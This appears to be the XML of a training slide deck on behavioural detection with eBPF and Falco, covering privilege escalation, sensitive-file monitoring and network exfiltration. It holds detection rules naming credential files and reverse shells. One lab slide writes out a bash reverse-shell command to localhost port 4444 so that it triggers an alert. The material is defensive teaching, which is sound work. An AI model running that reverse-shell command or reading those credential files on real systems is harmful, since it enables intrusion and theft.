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182880" cy="51435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Sécurité &amp;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Detection comportementale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eBPF • Falco • Falcosidekick • VictoriaMetrics • Grafana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3200400"/>
            <a:ext cx="54864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3101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Prerequisite: Module 0 (eBPF Foundation) complete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3749040"/>
            <a:ext cx="1920240" cy="292608"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A2E4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3749040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Privilege escalation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88920" y="3749040"/>
            <a:ext cx="1920240" cy="292608"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A2E4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16352" y="3749040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Files sensibles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92040" y="3749040"/>
            <a:ext cx="1920240" cy="292608"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A2E4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3749040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Exfiltration réseau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95160" y="3749040"/>
            <a:ext cx="1920240" cy="292608"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A2E4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22592" y="3749040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Lab EDR (Falco + eBPF)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Track B :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93776" cy="93268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777240"/>
            <a:ext cx="493776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77824" y="850392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Privilege escalation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7824" y="1179576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setuid, setreuid, capset, execve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eBPF + règles Falco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680960" y="1051560"/>
            <a:ext cx="1005840" cy="3291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0" y="105156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837944"/>
            <a:ext cx="85953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837944"/>
            <a:ext cx="493776" cy="93268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837944"/>
            <a:ext cx="493776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77824" y="1911096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Files sensibles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77824" y="2240280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opensnoop, map de liste noire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/etc/shadow, SSH, credentials cloud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680960" y="2112264"/>
            <a:ext cx="1005840" cy="32918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0" y="211226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898648"/>
            <a:ext cx="85953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898648"/>
            <a:ext cx="493776" cy="9326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898648"/>
            <a:ext cx="493776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77824" y="2971800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Exfiltration réseau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77824" y="3300984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tcp_connect, DNS tunneling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shell, connexions suspectes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80960" y="3172968"/>
            <a:ext cx="1005840" cy="32918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0" y="317296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959352"/>
            <a:ext cx="85953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959352"/>
            <a:ext cx="493776" cy="9326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3959352"/>
            <a:ext cx="493776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77824" y="4032504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 EDR maison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77824" y="4361688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Falco + Falcosidekick + VictoriaMetrics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Grafana + scenarios d'attaque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680960" y="4233672"/>
            <a:ext cx="1005840" cy="3291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7680960" y="423367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Privilege escalation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" y="21945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setuid • setreuid • capset • SUID binaries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2834640"/>
            <a:ext cx="137160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28346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T1548.001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737360" y="2834640"/>
            <a:ext cx="137160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28346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T1548.003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7432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minutes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Anatomie d'une escalade de privileges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251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4251960" cy="31089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49808"/>
            <a:ext cx="4069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Vertical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133856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Utilisateur -&gt; root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UID 0 depuis un compte non privilegie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4069080" cy="21945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828800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084832"/>
            <a:ext cx="40690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 SUID : sudo mal configure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LPE (Local Privilege Escalation)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749808"/>
            <a:ext cx="4251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749808"/>
            <a:ext cx="4251960" cy="31089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749808"/>
            <a:ext cx="4069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Horizontal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1133856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Utilisateur A -&gt; Utilisateur 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Meme niveau de privileges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1828800"/>
            <a:ext cx="4069080" cy="21945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828800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00600" y="2084832"/>
            <a:ext cx="40690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 de token de session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Abuse de clé SSH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4320" y="312724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Syscalls a surveiller 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3438144"/>
            <a:ext cx="162763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438144"/>
            <a:ext cx="1627632" cy="23774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" y="3438144"/>
            <a:ext cx="1517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setuid(0)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9184" y="3712464"/>
            <a:ext cx="15179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 l'UID effectif a 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011680" y="3438144"/>
            <a:ext cx="162763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011680" y="3438144"/>
            <a:ext cx="1627632" cy="23774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2066544" y="3438144"/>
            <a:ext cx="1517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setreuid(0,0)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066544" y="3712464"/>
            <a:ext cx="15179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UID reel et effectif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749040" y="3438144"/>
            <a:ext cx="162763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49040" y="3438144"/>
            <a:ext cx="1627632" cy="23774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9" name="Text 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3803904" y="3438144"/>
            <a:ext cx="1517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setresuid(0,0,0)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803904" y="3712464"/>
            <a:ext cx="15179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3 UIDs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0" y="3438144"/>
            <a:ext cx="162763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86400" y="3438144"/>
            <a:ext cx="1627632" cy="23774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3" name="Text 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5541264" y="3438144"/>
            <a:ext cx="1517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capset()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541264" y="3712464"/>
            <a:ext cx="15179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Modifies capabilities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223760" y="3438144"/>
            <a:ext cx="162763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223760" y="3438144"/>
            <a:ext cx="1627632" cy="23774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7" name="Text 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7278624" y="3438144"/>
            <a:ext cx="1517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prctl()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278624" y="3712464"/>
            <a:ext cx="15179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attributes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setuid(0) detection with bpftrace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in 30 seconds that the event is traceable before writing the full eBPF program.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52144"/>
            <a:ext cx="5029200" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="162130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52144"/>
            <a:ext cx="5029200" cy="21945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170432"/>
            <a:ext cx="4882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detection_setuid.bt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1408176"/>
            <a:ext cx="4846320" cy="1975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Immediate detection: setuid(0) from a non-root process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bpftrace -e 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tracepoint:syscalls:sys_enter_setuid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(args-&gt;uid == 0 &amp;&amp; uid != 0)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printf("[ALERTE] pid=%d uid=%d comm=%s\n",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pid, uid, comm);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}'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Tester : dans un autre terminal, exécuter : sudo whoami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40680" y="1170432"/>
            <a:ext cx="3429000" cy="585216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04688" y="118872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args-&gt;uid : l'UID demande (argument de setuid)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40680" y="1536192"/>
            <a:ext cx="3429000" cy="585216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04688" y="155448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uid : bpftrace builtin = current UID of the calling process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40680" y="1901952"/>
            <a:ext cx="3429000" cy="585216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04688" y="192024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double filtre : evite les faux positifs sur les processus déjà root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40680" y="2542032"/>
            <a:ext cx="3429000" cy="585216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04688" y="256032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Resultat : alerte immediate lors du sudo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493008"/>
            <a:ext cx="5029200" cy="1444752"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="16213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493008"/>
            <a:ext cx="5029200" cy="21945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3511296"/>
            <a:ext cx="4882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version_enrichie.bt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5760" y="3749040"/>
            <a:ext cx="484632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Enriched with PPID and timestamp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tracepoint:syscalls:sys_enter_setuid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(args-&gt;uid == 0 &amp;&amp; uid != 0)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printf("%llu SETUID0 pid=%d ppid=%d uid=%d comm=%s\n",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nsecs, pid, curtask-&gt;real_parent-&gt;pid,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uid, comm);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40680" y="3520440"/>
            <a:ext cx="342900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production: replace with a libbpf program using ring buffer for persistence.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Règles Falco : escalade de privileges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5029200" cy="3200400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="162130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5029200" cy="21945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768096"/>
            <a:ext cx="4882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privilege_escalation.yaml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4846320" cy="2889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Macro : processus legitimes autorises a appeler setuid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macro: privilege_tools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condition: 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proc.name in (su, sudo, login, sshd, polkit, pkexec)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Règle 1 : setuid(0) depuis non-root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rule: Privilege Escalation via setuid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condition: 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evt.type = setuid and evt.arg.uid = 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user.uid != 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not privilege_tools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output: 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Escalade privileges setuid(0)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(pid=%proc.pid comm=%proc.name user=%user.name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parent=%proc.pname cmdline=%proc.cmdline)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priority: CRITICAL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tags: [privilege_escalation, T1548.001]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40680" y="749808"/>
            <a:ext cx="342900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504688" y="78638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evt.type = setuid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04688" y="104241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Filtre sur le type d'événement syscall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04688" y="131673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verifier de conditions Falco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40680" y="1792224"/>
            <a:ext cx="342900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504688" y="182880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evt.arg.uid = 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504688" y="20848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Argument spécifique : l'UID demande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04688" y="23591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aux arguments du syscall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40680" y="2834640"/>
            <a:ext cx="342900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04688" y="287121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privilege_tools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504688" y="31272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 blanche des processus autorises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04688" y="34015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Reduire les faux positifs : la clé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40680" y="3877056"/>
            <a:ext cx="342900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04688" y="391363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priority: CRITICAL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504688" y="41696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Niveau de priorite de l'alerte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04688" y="444398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-&gt; immediate action required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4041648"/>
            <a:ext cx="137160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0416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T1548.001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737360" y="40416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Abuse Elevation Control Mechanism: Setuid and Setgid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Sensitive file monitoring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74320" y="21945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opensnoop • Blocklist map • Falco file rules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2834640"/>
            <a:ext cx="137160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28346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T1003.008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737360" y="2834640"/>
            <a:ext cx="137160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28346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T1552.001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0" y="2834640"/>
            <a:ext cx="137160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28346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T1098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7432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minutes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Files targeted by attackers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278892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2788920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749808"/>
            <a:ext cx="2642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/etc/shadow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47472" y="1078992"/>
            <a:ext cx="26426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/etc/passwd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/etc/gshadow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7472" y="1645920"/>
            <a:ext cx="264261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Hashes pour crackage offline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 des comptes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" y="2414016"/>
            <a:ext cx="137160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24140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T1003.008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54680" y="749808"/>
            <a:ext cx="278892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749808"/>
            <a:ext cx="2788920" cy="2743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3227832" y="749808"/>
            <a:ext cx="2642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/etc/sudoers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27832" y="1078992"/>
            <a:ext cx="26426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/etc/sudoers.d/*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/etc/pam.d/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27832" y="1645920"/>
            <a:ext cx="264261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les comptes sudo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Modifier pour persistance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27832" y="2414016"/>
            <a:ext cx="137160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3227832" y="24140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T1098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5040" y="749808"/>
            <a:ext cx="278892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749808"/>
            <a:ext cx="2788920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6108192" y="749808"/>
            <a:ext cx="2642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~/.ssh/id_rsa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108192" y="1078992"/>
            <a:ext cx="26426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id_ecdsa, id_ed25519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/etc/ssh/ssh_host_*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108192" y="1645920"/>
            <a:ext cx="264261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lateral sans mdp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Impersonnification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08192" y="2414016"/>
            <a:ext cx="137160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4" name="Text 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6108192" y="24140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T1552.004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3035808"/>
            <a:ext cx="425196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035808"/>
            <a:ext cx="4251960" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1E6FBF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" y="3035808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~/.aws/credentials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7472" y="3364992"/>
            <a:ext cx="41056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~/.kube/config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~/.gcloud/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7472" y="3931920"/>
            <a:ext cx="410565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cloud complet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Compromission infra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7472" y="4700016"/>
            <a:ext cx="137160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1" name="Text 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="347472" y="47000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T1552.001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17720" y="3035808"/>
            <a:ext cx="425196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17720" y="3035808"/>
            <a:ext cx="425196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4" name="Text 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4690872" y="3035808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/var/run/secrets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690872" y="3364992"/>
            <a:ext cx="41056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kubernetes.io/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serviceaccount/token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690872" y="3931920"/>
            <a:ext cx="410565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Attaque API server K8s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Escalade dans le cluster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90872" y="4700016"/>
            <a:ext cx="137160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8" name="Text 36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4690872" y="47000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T1552.007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eBPF opensnoop: monitoring file access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sys_enter_openat tracepoint fires on every file open on the system.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52144"/>
            <a:ext cx="5029200" cy="2377440"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="162130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52144"/>
            <a:ext cx="5029200" cy="21945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170432"/>
            <a:ext cx="4882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opensnoop_sensible.bt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1408176"/>
            <a:ext cx="4846320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Targeted sensitive file monitoring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bpftrace -e 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tracepoint:syscalls:sys_enter_openat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$f = str(args-&gt;filename);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($f == "/etc/shadow"           ||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$f == "/etc/sudoers"          ||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strncmp($f, "/root/.ssh/", 10) == 0 ||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strncmp($f, "/.aws/",  5) == 0)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printf("ACCES uid=%d pid=%d comm=%s -&gt; %s\n",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uid, pid, comm, $f);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}'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40680" y="115214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d'ouverture (args-&gt;flags) :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481328"/>
          <a:ext cx="3429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9601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O_RDONLY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O_WRONLY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O_RDWR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Lect/Ecrit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O_CREAT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O_TRUNC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Truncate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274320" y="3602736"/>
            <a:ext cx="8595360" cy="1371600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="16213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3602736"/>
            <a:ext cx="8595360" cy="21945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347472" y="3621024"/>
            <a:ext cx="84490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detection_ecriture.bt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65760" y="3858768"/>
            <a:ext cx="841248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Détecter les ECRITURES dans /etc/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tracepoint:syscalls:sys_enter_openat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((args-&gt;flags &amp; 3) != 0 &amp;&amp;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strncmp(str(args-&gt;filename), "/etc/", 5) == 0)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printf("ECRITURE uid=%d comm=%s -&gt; %s\n",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uid, comm, str(args-&gt;filename));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eBPF program with blocklist map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 : la liste est mise a jour depuis userspace sans recharger le programme. Overhead O(1) par appel openat.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52144"/>
            <a:ext cx="8595360" cy="3108960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="162130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52144"/>
            <a:ext cx="8595360" cy="21945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170432"/>
            <a:ext cx="84490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file_monitor.bpf.c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1408176"/>
            <a:ext cx="8412480" cy="2798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Map de chemins surveilles (clé = hash FNV-1a 32 bits)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{ __uint(type, BPF_MAP_TYPE_HASH);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__uint(max_entries, 64);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__type(key, u32); __type(value, u8); } watched SEC(".maps");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Ring buffer : événements vers userspace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{ __uint(type, BPF_MAP_TYPE_RINGBUF);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__uint(max_entries, 1&lt;&lt;20); } events SEC(".maps");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SEC("tracepoint/syscalls/sys_enter_openat")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monitor_open(struct trace_event_raw_sys_enter *ctx)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path[128];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bpf_probe_read_user_str(path, sizeof(path), (void*)ctx-&gt;args[1]);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u32 key = fnv1a(path);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u8 *hit = bpf_map_lookup_elem(&amp;watched, &amp;key);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(!hit) return 0;  // Pas surveille : ignorer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Envoyer l'événement vers userspace via ringbuf...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4334256"/>
            <a:ext cx="73152" cy="2560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4334256"/>
            <a:ext cx="73152" cy="2560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4334256"/>
            <a:ext cx="73152" cy="2560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4334256"/>
            <a:ext cx="73152" cy="2560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315968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fnv1a(path) : 32-bit hash of the path. O(1) lookup in the map.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bpf_map_lookup_elem : retourne NULL si le chemin n'est pas surveille.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 liste watched est mise a jour depuis userspace via bpf() syscall.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Limitation : les liens symboliques ne sont pas resolus. /etc/shadow et /etc/../etc/shadow ont des hashes différents.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Falco rules: file monitoring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5029200" cy="4187952"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="162130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5029200" cy="21945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768096"/>
            <a:ext cx="4882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file_monitoring.yaml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4846320" cy="3877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macro: sensitive_auth_files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condition: fd.name in (/etc/shadow, /etc/shadow-, /etc/gshadow)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macro: trusted_shadow_readers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condition: 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proc.name in (shadow, vipw, passwd, unix_chkpwd,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useradd, usermod, login, sshd, su, sudo)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rule: Shadow File Read by Untrusted Process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condition: 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open_read and sensitive_auth_files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not trusted_shadow_readers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output: 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Read /etc/shadow (pid=%proc.pid comm=%proc.name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user=%user.name parent=%proc.pname)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priority: HIGH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tags: [credential_access, T1003.008]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rule: LD_PRELOAD Manipulation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condition: open_write and fd.name = /etc/ld.so.preload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output: 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ROOTKIT potentiel via ld.so.preload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(pid=%proc.pid comm=%proc.name user=%user.name)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priority: CRITICAL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tags: [defense_evasion, T1574.006]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40680" y="749808"/>
            <a:ext cx="34290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40680" y="749808"/>
            <a:ext cx="640080" cy="58521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5440680" y="749808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126480" y="786384"/>
            <a:ext cx="2670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File Read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126480" y="1024128"/>
            <a:ext cx="2670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/etc/shadow par non-autorise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40680" y="1408176"/>
            <a:ext cx="34290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40680" y="1408176"/>
            <a:ext cx="640080" cy="58521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5440680" y="1408176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126480" y="1444752"/>
            <a:ext cx="2670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Config Write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26480" y="1682496"/>
            <a:ext cx="2670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/etc/passwd, /etc/sudoers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40680" y="2066544"/>
            <a:ext cx="34290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0680" y="2066544"/>
            <a:ext cx="640080" cy="58521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5440680" y="2066544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126480" y="2103120"/>
            <a:ext cx="2670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Private Key Access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126480" y="2340864"/>
            <a:ext cx="2670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clé privee SSH par non-autorise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40680" y="2724912"/>
            <a:ext cx="34290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40680" y="2724912"/>
            <a:ext cx="640080" cy="58521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5440680" y="2724912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126480" y="2761488"/>
            <a:ext cx="2670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Credentials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26480" y="2999232"/>
            <a:ext cx="2670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.aws/credentials, .kube/config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40680" y="3383280"/>
            <a:ext cx="34290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40680" y="3383280"/>
            <a:ext cx="640080" cy="58521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0" name="Text 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5440680" y="3383280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126480" y="3419856"/>
            <a:ext cx="2670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 via Cron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26480" y="3657600"/>
            <a:ext cx="2670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dans crontab où profil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40680" y="4041648"/>
            <a:ext cx="34290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40680" y="4041648"/>
            <a:ext cx="640080" cy="58521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5" name="Text 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5440680" y="4041648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126480" y="4078224"/>
            <a:ext cx="2670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LD_PRELOAD Manipulation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26480" y="4315968"/>
            <a:ext cx="2670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/etc/ld.so.preload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Network exfiltration detection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74320" y="21945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tcp_connect • DNS tunneling • Reverse shell • Suspicious connections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2834640"/>
            <a:ext cx="137160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28346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T1041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737360" y="2834640"/>
            <a:ext cx="137160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28346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T1071.004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0" y="2834640"/>
            <a:ext cx="137160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28346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T1059.004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7432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minutes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Network exfiltration techniques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25196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4251960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7498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Reverse Shell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768096"/>
            <a:ext cx="1152144" cy="237744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768096"/>
            <a:ext cx="11521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: port variable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47472" y="1078992"/>
            <a:ext cx="4096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avec stdin/stdout sur une socket réseau.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L'attaquant tape des commandes depuis l'exterieur.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1773936"/>
            <a:ext cx="4096512" cy="21945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1773936"/>
            <a:ext cx="4096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eBPF detection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7472" y="2029968"/>
            <a:ext cx="40965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749808"/>
            <a:ext cx="425196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749808"/>
            <a:ext cx="4251960" cy="2743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4782312" y="7498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DNS Tunneling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26680" y="768096"/>
            <a:ext cx="1152144" cy="237744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17" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7726680" y="768096"/>
            <a:ext cx="11521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UDP port 53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782312" y="1078992"/>
            <a:ext cx="4096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Donnees encapsulees dans des sous-domaines DNS.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53 rarement bloque en sortie.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82312" y="1773936"/>
            <a:ext cx="4096512" cy="21945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4782312" y="1773936"/>
            <a:ext cx="4096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eBPF detection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82312" y="2029968"/>
            <a:ext cx="40965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871216"/>
            <a:ext cx="425196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871216"/>
            <a:ext cx="4251960" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1E6FBF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" y="28712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HTTP(S) C2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889504"/>
            <a:ext cx="1152144" cy="237744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2889504"/>
            <a:ext cx="11521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80/443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47472" y="3200400"/>
            <a:ext cx="4096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Beacon périodique vers un serveur C2 via HTTP.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Trafic TLS chiffre : contenu opaque.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7472" y="3895344"/>
            <a:ext cx="4096512" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1E6FBF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" y="3895344"/>
            <a:ext cx="4096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eBPF detection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4151376"/>
            <a:ext cx="40965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2871216"/>
            <a:ext cx="425196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2871216"/>
            <a:ext cx="4251960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4782312" y="28712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Connexion directe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726680" y="2889504"/>
            <a:ext cx="1152144" cy="237744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35" name="Text 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7726680" y="2889504"/>
            <a:ext cx="11521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: port non standard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782312" y="3200400"/>
            <a:ext cx="4096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Connexion directe vers un port inhabituel.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Peut etre un outil de staging où de C2.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82312" y="3895344"/>
            <a:ext cx="4096512" cy="21945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8" name="Text 36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4782312" y="3895344"/>
            <a:ext cx="4096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eBPF detection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82312" y="4151376"/>
            <a:ext cx="40965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Tracing TCP connections with eBPF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5029200" cy="3657600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="162130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5029200" cy="21945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768096"/>
            <a:ext cx="4882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trace_tcp.bt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4846320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Detect all outbound TCP connections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bpftrace -e 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kprobe:tcp_connect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$sk   = (struct sock *)arg0;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$dport = bswap16($sk-&gt;sk_dport);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$daddr = ntop(2, $sk-&gt;sk_daddr);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printf("%llu TCP pid=%d comm=%-16s -&gt; %s:%d\n",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nsecs, pid, comm, $daddr, $dport);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}'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Version filtree : ports suspects seulement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kprobe:tcp_connect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$sk = (struct sock *)arg0;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$dp = bswap16($sk-&gt;sk_dport);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($dp != 80 &amp;&amp; $dp != 443 &amp;&amp; $dp != 22 &amp;&amp; $dp != 53)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printf("PORT_SUSPECT pid=%d comm=%s -&gt; %s:%d\n",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pid, comm, ntop(2, $sk-&gt;sk_daddr), $dp);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40680" y="749808"/>
            <a:ext cx="3429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504688" y="78638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060704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Pointer to the sock struct: contains source/dest IP and ports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40680" y="1645920"/>
            <a:ext cx="3429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04688" y="168249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bswap16()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04688" y="1956816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Convertit le port de network byte order a host byte order (little-endian)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40680" y="2542032"/>
            <a:ext cx="3429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04688" y="257860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ntop(2, addr)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04688" y="2852928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Convertit une adresse IPv4 binaire en chaine lisible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40680" y="3438144"/>
            <a:ext cx="3429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04688" y="347472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sk-&gt;sk_dport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04688" y="3749040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 port in the kernel sock struct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40680" y="4608576"/>
            <a:ext cx="34290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 : le contenu TLS/HTTPS est chiffre et opaque pour eBPF au niveau réseau. To inspect content: use uprobes on OpenSSL (Track D).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Falco rules: network exfiltration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5029200" cy="3657600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="162130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5029200" cy="21945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768096"/>
            <a:ext cx="4882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network_rules.yaml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4846320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Reverse shell: shell stdin = network socket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rule: Reverse Shell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condition: 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spawned_process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proc.name in (bash, sh, dash, zsh, ksh)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proc.stdin.type in (ipv4, ipv6)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output: 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REVERSE SHELL (pid=%proc.pid shell=%proc.name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remote=%fd.rip:%fd.rport parent=%proc.pname)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priority: CRITICAL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tags: [T1059.004]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Shell child of a web service: likely RCE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rule: Shell from Web Service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condition: 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spawned_process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proc.name in (bash, sh, dash)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proc.pname in (apache2, nginx, php-fpm, tomcat, node)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priority: CRITICAL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tags: [T1059.004, T1505.003]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40680" y="749808"/>
            <a:ext cx="3429000" cy="3657600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="162130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40680" y="749808"/>
            <a:ext cx="3429000" cy="23774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5468112" y="749808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demo_reverse_shell.sh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559552" y="1024128"/>
            <a:ext cx="3218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Terminal 1 (attacker)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59552" y="1271016"/>
            <a:ext cx="3218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 -lvp 4444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559552" y="1764792"/>
            <a:ext cx="3218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Terminal 2 (victim)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559552" y="2011680"/>
            <a:ext cx="3218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-i &gt;&amp;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59552" y="2258568"/>
            <a:ext cx="3218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/dev/tcp/127.0.0.1/4444 0&gt;&amp;1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59552" y="2752344"/>
            <a:ext cx="3218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Falco CRITICAL alert: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59552" y="2999232"/>
            <a:ext cx="3218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REVERSE SHELL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559552" y="3246120"/>
            <a:ext cx="3218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shell=bash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59552" y="3493008"/>
            <a:ext cx="3218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remote=127.0.0.1:4444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4498848"/>
            <a:ext cx="137160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4988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T1041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737360" y="4498848"/>
            <a:ext cx="137160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3" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1737360" y="44988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T1059.004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0" y="4498848"/>
            <a:ext cx="137160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0" y="44988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T1071.004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 EDR maison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74320" y="19202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Falco + Falcosidekick + VictoriaMetrics + Grafana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74320" y="24688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complete detection chain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minutes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3474720"/>
            <a:ext cx="2011680" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A2E4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3474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Falco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3520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68880" y="3474720"/>
            <a:ext cx="2011680" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A2E4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3474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Falcosidekick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0" y="3520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63440" y="3474720"/>
            <a:ext cx="2011680" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A2E4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474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VictoriaMetrics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3520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0" y="3474720"/>
            <a:ext cx="2011680" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A2E4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3474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de la chaine de détection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47088" y="2249424"/>
            <a:ext cx="512064" cy="9144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5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2176272" y="2103120"/>
            <a:ext cx="237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166420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1664208" cy="32918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" y="84124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Kernel Linux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(hote)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9184" y="1225296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Syscalls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Evenements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Reseau, Files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67328" y="2249424"/>
            <a:ext cx="512064" cy="9144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1" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4096512" y="2103120"/>
            <a:ext cx="237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94560" y="841248"/>
            <a:ext cx="166420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94560" y="841248"/>
            <a:ext cx="1664208" cy="3291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2249424" y="84124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Falco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(driver eBPF)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49424" y="1225296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syscalls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Evalue règles YAML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Sortie : JSON + gRPC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87568" y="2249424"/>
            <a:ext cx="512064" cy="9144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7" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6016752" y="2103120"/>
            <a:ext cx="237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0" y="841248"/>
            <a:ext cx="166420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0" y="841248"/>
            <a:ext cx="1664208" cy="32918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4169664" y="84124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Falcosidekick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69664" y="1225296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Consomme alertes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vers SIEM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Explose /metrics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607808" y="2249424"/>
            <a:ext cx="512064" cy="9144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3" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7936992" y="2103120"/>
            <a:ext cx="237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35040" y="841248"/>
            <a:ext cx="166420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841248"/>
            <a:ext cx="1664208" cy="329184"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1E6FBF"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6089904" y="84124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VictoriaMetrics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89904" y="1225296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Scrape Falcosidekick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Stocke compteurs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PromQL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955280" y="841248"/>
            <a:ext cx="166420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955280" y="841248"/>
            <a:ext cx="1664208" cy="3291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8010144" y="84124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Grafana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10144" y="1225296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Alertes par priorite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règles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4498848"/>
            <a:ext cx="8595360" cy="512064"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F0FFF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535424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EDR commercial : open source (CNCF) • règles versionnables dans git • overhead &lt; 2% CPU • deployable en environnement OT/souverain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Falco configuration: modern eBPF driver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5029200" cy="3657600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="16213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5029200" cy="21945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768096"/>
            <a:ext cx="4882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falco.yaml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4846320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falco.yaml : extraits cles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Driver: modern eBPF (CO-RE, kernel &gt;= 5.8, BTF required)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kind: modern_ebpf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modern_ebpf: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cpus_for_each_syscall_buffer: 2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JSON output for Falcosidekick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json_output: true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json_include_output_property: true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Alert log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file_output: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enabled: true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filename: /var/log/falco/falco.log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gRPC for Falcosidekick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grpc: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enabled: true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bind_address: "unix:///run/falco/falco.sock"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grpc_output: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enabled: true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40680" y="74980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Choix du driver :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078992"/>
          <a:ext cx="3429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6858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Driver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Prerequisites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Recommande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modern_ebpf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Kernel 5.8+, BTF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ebpf classic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Kernel 4.14+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Kernels anciens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kernel module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Headers kernel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eviter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40680" y="2651760"/>
            <a:ext cx="3429000" cy="1773936"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="16213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40680" y="2651760"/>
            <a:ext cx="3429000" cy="21945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9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5513832" y="2670048"/>
            <a:ext cx="32826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lab_commands.sh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532120" y="2907792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Démarrer le lab Docker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./scripts/start.sh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Observer les alertes en temps reel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logs -f falco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Reload rules without restart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exec falco kill -1 $(pidof falco)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Falcosidekick metrics + PromQL queries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1463040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
